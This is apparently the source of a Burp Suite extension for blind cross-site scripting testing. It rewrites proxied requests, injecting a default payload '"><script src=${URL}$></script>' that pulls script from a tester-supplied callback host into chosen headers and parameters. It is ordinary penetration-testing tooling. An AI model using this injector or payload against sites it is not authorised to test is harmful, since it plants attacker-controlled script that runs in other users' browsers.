from burp import IBurpExtender
from burp import ITab
from burp import IHttpListener
from burp import IInterceptedProxyMessage
from burp import IMessageEditorController
from burp import IContextMenuInvocation
from javax.swing import (JLabel, JTextField, JOptionPane,
    JTabbedPane, JPanel, JButton, JMenuItem, JTable, JScrollPane,
    JCheckBox, BorderFactory, Box, JFileChooser)
from javax.swing.border import EmptyBorder
from java.awt import (GridBagLayout, Dimension, GridBagConstraints,
    Color, FlowLayout, BorderLayout, Insets)
from java.net import URL
from javax import swing
from javax.swing.table import AbstractTableModel, DefaultTableModel
from javax.swing.event import TableModelEvent, TableModelListener
from StringIO import StringIO
import re
import threading
import random
from java.lang import Runnable
from java.util import ArrayList


class MyTableModelListener(TableModelListener):
    def __init__(self, table, burp, _type):
        self.table = table
        self.burp = burp
        self._type = _type

    def tableChanged(self, e):
        firstRow = e.getFirstRow()
        lastRow = e.getLastRow()
        index = e.getColumn()
        # print(str(self.burp._dictPayloads))
        if self._type == 1:
            self.burp._dictPayloads = {x[0]:x[1] for x in self.burp._tableModelPayloads.getDataVector()}
        elif self._type == 2:
            self.burp._dictHeaders = {x[0]:x[1] for x in self.burp._tableModelHeaders.getDataVector()}
        elif self._type == 3:
            self.burp._dictParams = {x[0]:x[1] for x in self.burp._tableModelParams.getDataVector()}


class PyRunnable(Runnable):
    """This class is used to wrap a python callable object into a Java Runnable that is 
       suitable to be passed to various Java methods that perform callbacks.
    """
    def __init__(self, target, *args, **kwargs):
        """Creates a PyRunnable.
           target - The callable object that will be called when this is run.
           *args - Variable positional arguments
           **wkargs - Variable keywoard arguments.
        """
        self.target = target
        self.args = args
        self.kwargs = kwargs
    
    def run(self):
        self.target(*self.args, **self.kwargs)


class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController, AbstractTableModel, IContextMenuInvocation):
    name = "Blind XSS_"
    _jTabbedPane = JTabbedPane()
    _jPanel = JPanel()
    _jAboutPanel = JPanel()
    _jPanelConstraints = GridBagConstraints()
    _jLabelParameters = None
    _jTextFieldParameters = None
    _jLabelTechniques = None
    _jTextFieldURL = None
    _jLabelFuzzFactor = None
    _jTextFieldFuzzFactor = None
    _jLabelAdditionalCmdLine = None
    _jTextFieldAdditionalCmdLine = None
    _jButtonSetCommandLine = None
    _jLabelAbout = None
    _overwriteHeader = False
    _overwriteParam = False

    #
    # implement IBurpExtender
    #
    def registerExtenderCallbacks(self, callbacks):
        # keep a reference to our callbacks object
        self._callbacks = callbacks
        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()
        # set our extension name
        self._callbacks.setExtensionName(self.name)
        # lists of hosts with querys

        self._dictPayloads = {}
        self._dictPayloads_headers = {}
        self._dictPayloads_params = {}
        self._dictHeaders = {}
        self._dictParams = {}

        self.status_flag = False
        self.table_flag = 0
        self.start_button_text = 'Run proxy'
        self._layout = GridBagLayout()
        self._jPanel.setLayout(self._layout)

        self._jLabelTechniques = JLabel("Press to start:")
        self.createAnyView(self._jLabelTechniques, 0, 0, 3, 1, Insets(0, 0, 10, 0))

        self.submitSearchButton = swing.JButton(self.start_button_text, actionPerformed=self.active_flag)
        self.submitSearchButton.setBackground(Color.WHITE)
        self.createAnyView(self.submitSearchButton, 3, 0, 6, 1, Insets(0, 0, 10, 0))

        self._jPanel.setBounds(0, 0, 1000, 1000)
        self._jLabelTechniques = JLabel("Your URL (my.burpcollaborator.net):")
        self.createAnyView(self._jLabelTechniques, 0, 1, 3, 1, Insets(0, 0, 10, 0))

        self._jTextFieldURL = JTextField("", 30)
        self.createAnyView(self._jTextFieldURL, 3, 1, 6, 1, Insets(0, 0, 10, 0))

        self._tableModelPayloads = DefaultTableModel() 
        self._tableModelPayloads.addColumn("Payload")
        self._tableModelPayloads.addColumn("Using")

        self._tableModelHeaders = DefaultTableModel() 
        self._tableModelHeaders.addColumn("Header")
        self._tableModelHeaders.addColumn("Using")

        self._tableModelParams = DefaultTableModel() 
        self._tableModelParams.addColumn("Parameter")
        self._tableModelParams.addColumn("Using")

        self._table = JTable(self._tableModelPayloads)
        self._table.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS)
        self._table.getModel().addTableModelListener(MyTableModelListener(self._table, self, 1))
        self._scrolltable = JScrollPane(self._table)
        self._scrolltable.setMinimumSize(Dimension(300, 200))
        self.createAnyView(self._scrolltable, 0, 2, 3, 1, Insets(0, 0, 0, 10))

        self._table = JTable(self._tableModelHeaders)
        self._table.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS)
        self._table.getModel().addTableModelListener(MyTableModelListener(self._table, self, 2))
        self._scrolltable = JScrollPane(self._table)
        self._scrolltable.setMinimumSize(Dimension(300, 200))
        self.createAnyView(self._scrolltable, 3, 2, 3, 1, Insets(0, 0, 0, 10))

        self._table = JTable(self._tableModelParams)
        self._table.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS)
        self._table.getModel().addTableModelListener(MyTableModelListener(self._table, self, 3))
        self._scrolltable = JScrollPane(self._table)
        self._scrolltable.setMinimumSize(Dimension(300, 200))
        self.createAnyView(self._scrolltable, 6, 2, 3, 1, Insets(0, 0, 0, 0))

        deletePayloadButton = swing.JButton('Delete',actionPerformed=self.deleteToPayload)
        deletePayloadButton.setBackground(Color.WHITE)
        self.createAnyView(deletePayloadButton, 0, 3, 1, 1, Insets(3, 0, 0, 0))

        deletePayloadButton = swing.JButton('Upload',actionPerformed=self.uploadToPayload)
        deletePayloadButton.setBackground(Color.WHITE)
        self.createAnyView(deletePayloadButton, 1, 3, 1, 1, Insets(3, 0, 0, 0))

        addPayloadButton = swing.JButton('Add',actionPerformed=self.addToPayload)
        addPayloadButton.setBackground(Color.WHITE)
        self.createAnyView(addPayloadButton, 2, 3, 1, 1, Insets(3, 0, 0, 10))

        deleteHeaderButton = swing.JButton('Delete',actionPerformed=self.deleteToHeader)
        deleteHeaderButton.setBackground(Color.WHITE)
        self.createAnyView(deleteHeaderButton, 3, 3, 1, 1, Insets(3, 0, 0, 0))

        self._overwriteHeaderButton = swing.JButton('Overwrite',actionPerformed=self.overwriteHeader)
        self._overwriteHeaderButton.setBackground(Color.WHITE)
        self.createAnyView(self._overwriteHeaderButton, 4, 3, 1, 1, Insets(3, 0, 0, 0))

        addHeaderButton = swing.JButton('Add',actionPerformed=self.addToHeader)
        addHeaderButton.setBackground(Color.WHITE)
        self.createAnyView(addHeaderButton, 5, 3, 1, 1, Insets(3, 0, 0, 10))

        deleteParamsButton = swing.JButton('Delete',actionPerformed=self.deleteToParams)
        deleteParamsButton.setBackground(Color.WHITE)
        self.createAnyView(deleteParamsButton, 6, 3, 1, 1, Insets(3, 0, 0, 0))

        self._overwriteParamButton = swing.JButton('Overwrite',actionPerformed=self.overwriteParam)
        self._overwriteParamButton.setBackground(Color.WHITE)
        self.createAnyView(self._overwriteParamButton, 7, 3, 1, 1, Insets(3, 0, 0, 0))

        addParamsButton = swing.JButton('Add',actionPerformed=self.addToParams)
        addParamsButton.setBackground(Color.WHITE)
        self.createAnyView(addParamsButton, 8, 3, 1, 1, Insets(3, 0, 0, 0))
        
        self._resultsTextArea = swing.JTextArea()
        resultsOutput = swing.JScrollPane(self._resultsTextArea)
        resultsOutput.setMinimumSize(Dimension(800,200))
        self.createAnyView(resultsOutput, 0, 4, 9, 1, Insets(10, 0, 0, 0))

        self.clearSearchButton = swing.JButton('Clear Search Output',actionPerformed=self.clearOutput)
        self.createAnyView(self.clearSearchButton, 3, 6, 3, 1, Insets(3, 0, 0, 0))

        self._callbacks.customizeUiComponent(self._jPanel)
        self._callbacks.addSuiteTab(self)
        self.starterPack()

        self._callbacks.registerHttpListener(self)

        return


    def createAnyView(self, _component, gridx, gridy, gridwidth, gridheight, insets):
        self._jPanelConstraints.fill = GridBagConstraints.HORIZONTAL
        self._jPanelConstraints.gridx = gridx
        self._jPanelConstraints.gridy = gridy
        self._jPanelConstraints.gridwidth = gridwidth
        self._jPanelConstraints.gridheight = gridheight
        self._jPanelConstraints.insets = insets
        self._jPanel.add(_component, self._jPanelConstraints)

    def starterPack(self):
        self._tableModelPayloads.insertRow(self._tableModelPayloads.getRowCount(), [r'"><script src=${URL}$></script>', '1'])
        self._tableModelHeaders.insertRow(self._tableModelHeaders.getRowCount(), ['User-agent', '1'])
        self._tableModelParams.insertRow(self._tableModelParams.getRowCount(), ['test', '1'])


    def addToPayload(self, button):
        self._tableModelPayloads.insertRow(self._tableModelPayloads.getRowCount(), ['', ''])

    def addToHeader(self, button):
        self._tableModelHeaders.insertRow(self._tableModelHeaders.getRowCount(), ['', ''])

    def addToParams(self, button):
        self._tableModelParams.insertRow(self._tableModelParams.getRowCount(), ['', ''])

    def uploadToPayload(self, button):
        self.jfc = JFileChooser("./")
        self.jfc.setDialogTitle("Upload Payloads")
        self._returnFileChooser = self.jfc.showDialog(None, "Open")
        if (self._returnFileChooser == JFileChooser.APPROVE_OPTION):
            selectedFile = self.jfc.getSelectedFile()
            self.fileUpload(selectedFile)

    def deleteToPayload(self, button):
        self._tableModelPayloads.removeRow(self._tableModelPayloads.getRowCount()-1)

    def deleteToHeader(self, button):
        self._tableModelHeaders.removeRow(self._tableModelHeaders.getRowCount()-1)

    def deleteToParams(self, button):
        self._tableModelParams.removeRow(self._tableModelParams.getRowCount()-1)

    def clearOutput(self, button):
        self._resultsTextArea.setText("")

    def fileUpload(self, path):
        with open(str(path), "r") as f:
            for line in f:
                self._tableModelPayloads.insertRow(self._tableModelPayloads.getRowCount(), [str(line), '1'])


    def active_flag(self, button):
        if not self.status_flag:
            for idx, key in enumerate(self._dictHeaders):
                if self._dictHeaders[key] == '1':
                    self._dictPayloads_headers[key] = self._dictHeaders[key]

            for idx, key in enumerate(self._dictParams):
                if self._dictParams[key] == '1':
                    self._dictPayloads_params[key] = self._dictParams[key]

            self.status_flag = True
            self.submitSearchButton.setBackground(Color.GRAY)
            self.appendToResults("Proxy start...")

        elif self.status_flag:
            self.status_flag = False
            self.submitSearchButton.setBackground(Color.WHITE)
            self.appendToResults("Proxy stop...")


    def overwriteHeader(self, button):
        if not self._overwriteHeader:
            self._overwriteHeader = True
            self._overwriteHeaderButton.setBackground(Color.GRAY)

        elif self._overwriteHeader:
            self._overwriteHeader = False
            self._overwriteHeaderButton.setBackground(Color.WHITE)

    def overwriteParam(self, button):
        if not self._overwriteParam:
            self._overwriteParam = True
            self._overwriteParamButton.setBackground(Color.GRAY)

        elif self._overwriteParam:
            self._overwriteParam = False
            self._overwriteParamButton.setBackground(Color.WHITE)


    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        try:
            if not self.status_flag:
                return
            # only process requests
            if not messageIsRequest:
                return

            requestString = messageInfo.getRequest().tostring()

            listHeader = re.findall('([\w-]+):\s?(.*)', requestString)
            dictRealHeaders = {x[0].lower():x[1] for x in listHeader}

            for index, key in enumerate(self._dictPayloads_headers):
                if key.lower() in dictRealHeaders.keys():
                    if len(self._dictPayloads.keys()) == 0:
                        pass
                    elif self._overwriteHeader:
                        payload = random.choice(self._dictPayloads.keys())
                        payload = payload.replace(r"${URL}$", self._jTextFieldURL.text, 1)
                        requestString = requestString.replace(dictRealHeaders.get(key.lower()), payload, 1)
                    elif not self._overwriteHeader:
                        payload = random.choice(self._dictPayloads.keys())
                        payload = payload.replace(r"${URL}$", self._jTextFieldURL.text, 1)
                        payload = dictRealHeaders.get(key.lower()) + payload
                        requestString = requestString.replace(dictRealHeaders.get(key.lower()), payload, 1)
                else:
                    pass

            listParam = re.findall('[\?|\&]([^=]+)\=([^& ])+', requestString)
            dictRealParams = {x[0].lower():x[1] for x in listParam}
            url = requestString.split(" HTTP/1.")
            for index, key in enumerate(self._dictPayloads_params):
                if key.lower() in dictRealParams.keys():
                    if len(self._dictPayloads.keys()) == 0:
                        pass
                    elif self._overwriteParam:
                        payload = random.choice(self._dictPayloads.keys())
                        payload = payload.replace(r"${URL}$", self._jTextFieldURL.text, 1)
                        url[0] = url[0].replace(dictRealParams.get(key.lower()), payload, 1)
                    elif not self._overwriteParam:
                        payload = random.choice(self._dictPayloads.keys())
                        payload = payload.replace(r"${URL}$", self._jTextFieldURL.text, 1)
                        payload = dictRealParams.get(key.lower()) + payload
                        url[0] = url[0].replace(dictRealParams.get(key.lower()), payload, 1)
                else:
                    pass
            requestString = "{} HTTP/1.{}".format(url[0], url[1])

            self.appendToResults(requestString.encode())
            messageInfo.setRequest(requestString.encode())
        except Exception as msg:
            self.appendToResults(msg)

        
    # Fnction to provide output to GUI
    def appendToResults(self, s):
        """Appends results to the resultsTextArea in a thread safe mannor. Results will be
           appended in the order that this function is called.
        """
        def appendToResults_run(s):  
            self._resultsTextArea.append(s)
            self._resultsTextArea.append('\n')

        swing.SwingUtilities.invokeLater(PyRunnable(appendToResults_run, s))


    def getTabCaption(self):
        return self.name


    def getUiComponent(self):
        return self._jPanel
